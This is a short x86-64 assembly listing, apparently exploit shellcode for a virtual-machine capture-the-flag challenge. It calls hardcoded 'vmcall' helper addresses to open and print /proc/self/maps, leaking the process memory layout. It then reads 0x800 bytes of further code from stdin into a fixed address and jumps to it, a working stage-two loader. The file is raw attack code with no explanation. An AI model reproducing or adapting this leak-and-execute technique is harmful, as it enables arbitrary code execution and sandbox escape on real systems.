mov r15, 0xDC2 /* vmcall_read */
mov r14, 0xE8A /* vmcall_write */
mov r13, 0xE7E /* vmcall_open */
mov r12, 0xEE6 /* vmcall_lseek */
mov r11, 0x3731383036323931

call self
self:
pop r10

/*push r11
call print_qword*/

lea rdi, [r10 + (map_name - self)]
call r13
mov rdi, rax
mov rsi, 0x200000
mov rdx, 0x800
call r15
mov rdi, 1
mov rsi, 0x200000
mov rdx, 0x800
call r14

mov r14, 0x10000
xor r13, r13
again:
mov rdi, 0
lea rsi, [r14 + r13]
mov rdx, 1
mov rax, 0
call r15
add r13, rax
cmp r13, 0x800
jnz again

jmp r14

hlt

print_qword:
push rsi
lea rsi, [rsp + 16]
mov rdx, 8
mov rdi, 1
mov rax, 1
call r14
pop rsi
ret 8

map_name:
.string "/proc/self/maps\x00"
